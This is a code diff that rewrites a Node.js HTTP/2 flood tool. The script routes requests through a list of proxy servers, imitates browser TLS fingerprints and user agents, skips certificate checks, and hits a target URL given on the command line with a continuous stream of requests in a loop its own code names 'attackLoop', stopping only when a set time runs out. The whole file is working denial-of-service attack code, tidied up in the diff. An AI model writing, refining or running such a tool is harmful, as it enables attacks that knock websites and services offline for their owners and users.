@@ -1,130 +1,149 @@
-const { exec } = require('child_process');
-require('events').EventEmitter.defaultMaxListeners = 0;
-process.setMaxListeners(0);
-
 const fs = require('fs');
 const url = require('url');
 const http = require('http');
 const tls = require('tls');
 const crypto = require('crypto');
 const http2 = require('http2');
-tls.DEFAULT_ECDH_CURVE;
+
+require('events').EventEmitter.defaultMaxListeners = 0;
+process.setMaxListeners(0);
 
 let payload = {};
 
+// Load proxies
+let proxies;
 try {
-var proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');
-} catch(error){
-console.log('Proxy file no found, "proxy.txt".');
-process.exit();
+    proxies = fs.readFileSync("proxy.txt", 'utf-8').split('\n').map(line => line.trim()).filter(Boolean);
+} catch (error) {
+    console.error('Proxy file not found: "proxy.txt".');
+    process.exit(1);
 }
 
+// Load user agents
+let userAgents;
 try {
-var objetive = process.argv[2];
-var parsed = url.parse(objetive);
-} catch(error){
-    console.log('Fail to load target date.');
-    process.exit();
+    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').map(line => line.trim()).filter(Boolean);
+} catch (error) {
+    console.error('Failed to load "ua.txt".');
+    process.exit(1);
 }
 
+// Parse target URL
+let targetUrl;
+let parsedUrl;
+try {
+    targetUrl = process.argv[2];
+    parsedUrl = url.parse(targetUrl);
+} catch (error) {
+    console.error('Failed to load target URL.');
+    process.exit(1);
+}
 
- try {
-var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
- } catch(error){
-     console.log('Fail to load ua.txt')
- }
+const sigalgs = [
+    'ecdsa_secp256r1_sha256',
+    'ecdsa_secp384r1_sha384',
+    'ecdsa_secp521r1_sha512',
+    'rsa_pss_rsae_sha256',
+    'rsa_pss_rsae_sha384',
+    'rsa_pss_rsae_sha512',
+    'rsa_pkcs1_sha256',
+    'rsa_pkcs1_sha384',
+    'rsa_pkcs1_sha512'
+].join(':');
+
 class TlsBuilder {
-    constructor (socket){
-        this.curve = "GREASE:X25519:x25519"; // Default
-        // this.sigalgs = SignalsList;
-        this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_NO_TICKET|crypto.constants.SSL_OP_NO_SSLv2|crypto.constants.SSL_OP_NO_SSLv3|crypto.constants.SSL_OP_NO_COMPRESSION|crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION|crypto.constants.SSL_OP_TLSEXT_PADDING|crypto.constants.SSL_OP_ALL|crypto.constants.SSLcom;
+    constructor(socket) {
+        this.socket = socket;
+        this.curve = "GREASE:X25519:x25519";
+        this.sigalgs = sigalgs;
+        this.options = crypto.constants.SSL_OP_NO_RENEGOTIATION |
+            crypto.constants.SSL_OP_NO_TICKET |
+            crypto.constants.SSL_OP_NO_SSLv2 |
+            crypto.constants.SSL_OP_NO_SSLv3 |
+            crypto.constants.SSL_OP_NO_COMPRESSION |
+            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
+            crypto.constants.SSL_OP_TLSEXT_PADDING |
+            crypto.constants.SSL_OP_ALL;
     }
 
-    Alert(){
-    }
-
-    http2TUNNEL(socket){
-        socket.setKeepAlive(true, 1);
-        socket.setTimeout(1);
+    createHttp2Tunnel() {
+        this.socket.setKeepAlive(true, 1000);
         payload[":method"] = "GET";
-        payload["Referer"] = objetive;
-        payload["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
-        payload["Cache-Control"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
-        payload["Pragma"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
-        payload['client-control'] = 'max-age=43200, s-max-age=43200';
-        payload['Upgrade-Insecure-Requests'] = 1;
-        payload['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"; //'*/*';
-        payload['Accept-Encoding'] = 'gzip, deflate, br';
-        payload['Accept-Language'] = 'utf-8, iso-8859-1;q=0.5, *;q=0.1'
-        payload[":path"] = parsed.path;
+        payload["Referer"] = targetUrl;
+        payload["User-agent"] = userAgents[Math.floor(Math.random() * userAgents.length)];
+        payload["Cache-Control"] = 'no-cache, no-store, private, max-age=0, must-revalidate';
+        payload["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+        payload["Accept-Encoding"] = 'gzip, deflate, br';
+        payload["Accept-Language"] = 'en-US,en;q=0.9';
+        payload[":path"] = parsedUrl.path;
 
-        const tunnel = http2.connect(parsed.href, {
+        const tunnel = http2.connect(parsedUrl.href, {
             createConnection: () => tls.connect({
-                socket: socket,
-                ciphers: tls.getCiphers().join(':')+":TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256"+":HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:"+'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
-                host: parsed.host,
-                servername: parsed.host,
+                socket: this.socket,
+                ciphers: tls.getCiphers().join(':') + ":TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256:HIGH:!aNULL:!kRSA:!MD5:!RC4",
+                host: parsedUrl.host,
+                servername: parsedUrl.host,
                 secure: true,
-                echdCurve: this.curve,
                 honorCipherOrder: true,
-                requestCert: true,
-                secureOptions: this.Opt,
-                
-                // sigalgs: this.sigalgs,
+                secureOptions: this.options,
+                sigalgs: this.sigalgs,
                 rejectUnauthorized: false,
-                ALPNProtocols: ['h2'],
+                ALPNProtocols: ['h2']
             }, () => {
-                
-        for (let i = 0; i < 12; i++) {
-
-            setInterval(async () => {
-                await tunnel.request(payload).close()
-            });
-        }
+                for (let i = 0; i < 10; i++) {
+                    tunnel.request(payload).on('response', (headers) => {
+                        console.log("Response Headers:", headers);
+                    }).on('error', (err) => {
+                        console.error("Request Error:", err.message);
+                    }).end();
+                }
             })
-     });
+        });
+
+        tunnel.on('error', (err) => {
+            console.error("Tunnel Connection Error:", err.message);
+        });
     }
 }
 
-BuildTLS = new TlsBuilder();
-BuildTLS.Alert();
-const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, maxTotalSockets: Infinity, maxSockets: Infinity });
+function startAttack() {
+    proxies.forEach(proxy => {
+        const [proxyHost, proxyPort] = proxy.split(':');
+        const port = parseInt(proxyPort, 10);
 
-function Runner(){
-
-    for (let i = 0; i < 22; i++) {
-var proxy = proxies[Math.floor(Math.random() * proxies.length)];
-proxy = proxy.split(':');
-                    
-var req = http.get({ 
-        host: proxy[0],
-        port: proxy[1],
-        timeout: 1,
-        method: "CONNECT",
-        agent: keepAliveAgent,
-
-         path: parsed.host + ":443"
-        });
-        req.end();
-    
-        req.on('connect', (_, socket) =>  {
-            BuildTLS.http2TUNNEL(socket);
-        });
-
-        req.on('end', () => {
-            req.resume()
-            req.close();
-          });
+        // Validate the proxy port to ensure it is within the correct range
+        if (isNaN(port) || port < 0 || port >= 65536) {
+            console.error(`Invalid proxy port: ${proxyPort} in proxy ${proxy}`);
+            return;
         }
+
+        const req = http.get({
+            host: proxyHost,
+            port: port,
+            method: "CONNECT",
+            path: `${parsedUrl.host}:443`
+        });
+
+        req.on('connect', (res, socket) => {
+            console.log(`Connected to proxy ${proxyHost}:${port}`);
+            const tlsBuilder = new TlsBuilder(socket);
+            tlsBuilder.createHttp2Tunnel();
+        });
+
+        req.on('error', (err) => {
+            console.error(`Error connecting to proxy ${proxyHost}:${port}:`, err.message);
+        });
+    });
 }
 
-setInterval(Runner)
-
-setTimeout(function(){
-    process.exit();
-}, process.argv[3] * 1000);
-
-process.on('uncaughtException', function(er) {
+// Continuously run the attack
+setImmediate(function attackLoop() {
+    startAttack();
+    setImmediate(attackLoop);
 });
-process.on('unhandledRejection', function(er) {
-});
+
+// Stop attack after the specified duration
+setTimeout(() => process.exit(), process.argv[3] * 1000);
+
+process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err.message));
+process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err.message));
